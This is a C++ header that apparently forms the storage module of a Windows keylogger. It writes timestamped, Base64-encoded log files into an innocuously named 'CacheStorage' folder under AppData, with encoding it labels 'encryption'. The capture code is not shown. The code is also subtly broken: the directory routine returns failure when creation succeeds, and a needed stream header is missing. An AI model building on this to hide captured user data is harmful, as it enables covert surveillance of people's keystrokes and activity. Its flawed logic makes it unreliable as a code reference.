#ifndef IO_H
#define IO_H
#include <string>
#include <cstdlib>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"
#include <fstream>

namespace IO
{
    std::string GetPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("AppData"));
        std::string full = appdata_dir + "\\CacheStorage";
        return full + (append_seperator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path)
    {
        for(char &c: path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(MkOneDr(path))
                return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString(" ") + ".log";
        try
        {
            std::ofstream file(path + name);
            if(!file)
            return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file<<data;
            if(!file)
            return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }

    }
}

#endif
